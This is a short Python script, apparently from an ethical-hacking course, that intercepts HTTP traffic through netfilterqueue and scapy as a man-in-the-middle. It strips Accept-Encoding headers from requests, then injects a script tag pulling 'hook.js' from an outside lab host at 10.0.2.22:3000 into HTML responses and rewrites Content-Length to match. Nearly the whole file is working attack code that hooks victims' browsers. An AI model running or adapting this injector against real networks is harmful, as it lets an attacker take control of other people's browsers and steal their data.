#!/use/bin/env python

import netfilterqueue
import scapy.all as scapy
import re

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].chksum  # deleting the packet vlaue and scapy refilling auto in the IP section
    del packet[scapy.IP].len  # removing the length of the packet in IP section
    del packet[scapy.TCP].chksum  # deleting the packet vlaue and scapy refilling auto in the TCP section
    return packet



def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)



        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response ")
            #print(scapy_packet.show())
            injection_code = '<script src="http://10.0.2.22:3000/hook.js"></script>'
            load = scapy_packet[scapy.Raw].load.replace("</head>", injection_code + "</head>")
            content_len_search = re.search(r"(?:Content-Length:\s)(\d*)", load)
            if content_len_search and "text/html" in load:
                content_length = content_len_search.group(1)
                new_content_length = int(content_length) + int(len(injection_code))
                load = load.replace(str(content_length), str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))


    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()